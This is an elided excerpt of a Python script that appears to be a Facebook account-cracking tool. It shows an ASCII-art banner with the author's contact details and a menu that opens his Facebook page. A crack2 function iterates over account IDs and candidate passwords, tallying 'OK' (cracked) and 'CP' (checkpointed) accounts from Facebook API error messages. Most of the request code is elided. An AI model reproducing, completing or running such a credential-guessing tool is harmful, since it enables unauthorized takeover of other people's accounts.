...
def banner():
	...
	print("""%s\n\x1b[93;1m
     ...
     _    ____  _____   __ _    _   _ 
    / \  |  _ \|_ _\ \ / // \  | \ | |
   / _ \ | |_) || | \ V // _ \ |  \| |
  / ___ \|  _ < | |  | |/ ___ \| |\  |
 /_/   \_\_| \_\___| |_/_/   \_\_| \_|              
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mAriyan Islam 
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+880193655****
\x1b[93;1m Facebook page\x1b[92;1m=>      \x1b[93;1mIT'S ARIYAN OKH
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://www.facebook.com/Ariyan.Vau.44")
		exit()
	else:
		os.system("https://www.facebook.com/Ariyan.Vau.44")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [ARIYAN] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [ARIYAN-CP] %s|%s        '%(b,idf,pw))
